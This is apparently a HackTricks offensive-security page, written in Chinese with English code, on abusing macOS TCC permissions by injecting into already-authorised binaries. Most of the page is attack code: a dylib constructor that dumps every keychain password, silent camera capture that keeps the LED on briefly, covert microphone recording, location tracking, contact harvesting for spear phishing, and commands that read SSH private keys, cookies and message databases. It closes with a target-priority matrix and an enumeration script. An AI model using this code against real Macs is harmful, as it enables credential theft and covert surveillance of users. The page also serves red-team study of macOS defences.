# 通过 TCC 权限窃取 macOS 凭据和数据

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

macOS TCC（Transparency, Consent, and Control）保护对敏感用户数据的访问。当攻击者**攻陷一个已经获得 TCC 授权的二进制文件时**，便会继承这些权限。本页面记录了每项与数据窃取相关的 TCC 权限的利用潜力。<sup>[[2]](#references)</sup>

> [!WARNING]
> 向已获得 TCC 授权的二进制文件中注入代码（通过 DYLD injection、dylib hijacking 或 task port）会**静默继承其全部 TCC 权限**。同一进程读取受保护数据时，不会出现额外提示或验证。

---

## Keychain 访问组

### 目标

macOS Keychain 存储：
- **Wi-Fi 密码** — 所有已保存的无线网络凭据
- **网站密码** — Safari、Chrome（使用 Keychain 时）及其他浏览器的密码
- **应用程序密码** — 电子邮件账户、VPN 凭据、开发令牌
- **证书和私钥** — 代码签名、客户端 TLS、S/MIME 加密
- **安全备注** — 用户存储的机密信息

### Entitlement：`keychain-access-groups`

Keychain 项目按**访问组**进行组织。应用程序的 `keychain-access-groups` entitlement 列出了它可以访问的组：<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### 利用
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 摄像头访问权限 (kTCCServiceCamera)

### 利用

具有摄像头 TCC 授权（通过 `kTCCServiceCamera` 或 `com.apple.security.device.camera` entitlement）的 binary 可以捕获照片和视频：
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### 静默捕获
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> 从 **macOS Sonoma** 开始，菜单栏中的摄像头指示器会持续显示，且无法通过程序隐藏。在较旧的 macOS 版本中，短暂的 capture 可能不会产生明显的指示器。

---

## 麦克风访问（kTCCServiceMicrophone）

### Exploitation

麦克风访问会捕获内置麦克风、耳机或已连接音频输入设备的所有音频：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### 攻击：Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置跟踪（kTCCServiceLocation）

### 利用
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 持续跟踪
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 联系人 / 日历 / 照片

### 个人数据 Exfiltration

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 姓名、电子邮件、电话号码、地址 |
| `kTCCServiceCalendar` | `EventKit` | 会议、与会者、地点 |
| `kTCCServicePhotos` | `Photos.framework` | 照片、屏幕截图、位置元数据 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 联系人收集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

此 Entitlement 允许与 `com.apple.iCloudHelper` XPC service 通信，从而访问：
- **iCloud tokens** — 用户 Apple ID 的 authentication tokens
- **iCloud Drive** — 所有设备同步的文档
- **iCloud Keychain** — 在所有 Apple 设备之间同步的密码
- **Find My** — 用户所有 Apple 设备的位置<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromising 一个拥有 iCloud 权限的 binary 会将攻击范围从**单台设备扩展到整个 Apple 生态系统**：其他 Mac、iPhone、iPad、Apple Watch。iCloud Keychain sync 意味着可以访问所有设备上的 passwords。

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### 最强大的 TCC Permission

Full Disk Access 授予对**系统上每个文件**的 read capability，包括：
- 其他 apps 的 data（Messages、Mail、Safari history）
- TCC databases（揭示所有其他 permissions）
- SSH keys 和 configuration
- Browser cookies 和 session tokens
- Application databases 和 caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

评估可注入且已获 TCC 授权的二进制文件时，应根据数据价值确定优先级：

| 优先级 | TCC 权限 | 原因 |
|---|---|---|
| **Critical** | Full Disk Access | 可访问所有内容 |
| **Critical** | TCC Manager | 可授予任意权限 |
| **High** | Keychain Access Groups | 获取所有已存储的密码 |
| **High** | iCloud Account Access | 实现多设备入侵 |
| **High** | Input Monitoring (ListenEvent) | 键盘记录 |
| **High** | Accessibility | GUI 控制、自行授予权限 |
| **Medium** | Screen Capture | 捕获视觉数据 |
| **Medium** | Camera + Microphone | 监控 |
| **Medium** | Contacts + Calendar | 社会工程数据 |
| **Low** | Location | 实际位置跟踪 |
| **Low** | Photos | 个人数据 |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 参考资料

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — “What Happens on your Mac, Stays on Apple's iCloud?!”（Wojciech Regula）](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)

{{#include ../../../../banners/hacktricks-training.md}}
